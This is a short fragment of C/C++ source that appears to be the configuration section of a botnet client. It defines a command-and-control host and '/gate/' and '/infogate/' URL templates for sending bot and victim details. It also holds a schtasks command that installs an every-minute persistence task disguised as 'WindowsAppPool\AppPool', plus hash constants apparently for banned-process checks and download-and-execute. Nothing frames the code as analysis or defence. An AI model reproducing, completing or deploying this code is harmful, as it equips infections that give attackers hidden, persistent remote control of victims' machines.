...
{
	// Server config
	static LPCWSTR host = L"127.0.0.1";
	static BOOL isHttps = FALSE;
	static LPCWSTR prefix = L"DEBUGG";

	static LPCWSTR botidFmt = L"%08lX%04lX%lu";
	static LPCWSTR routerFmt = L"/gate/%s/%s/%d/%d/%d/%d/%d/";
	static LPCWSTR sendBotInfo = L"/infogate/%s/%s/%s/%d/%s/%s/%s/%s/%s/No/%s/path/";
	static LPCWSTR startupAddFmt = L"/c schtasks /create /F /sc minute /mo 1 /tn \"\WindowsAppPool\\AppPool\" /tr \"%s\"";
	static LPCWSTR cmdPath = L"C:\\Windows\\System32\\cmd.exe";
	static LPCWSTR lnkName = L"cmd.exe.lnk";
	static LPCWSTR backSlash = L"\\";

	static DWORD hashBanned = 0x068854b4;
	static const DWORD dlExecHash = 0x03c09260;
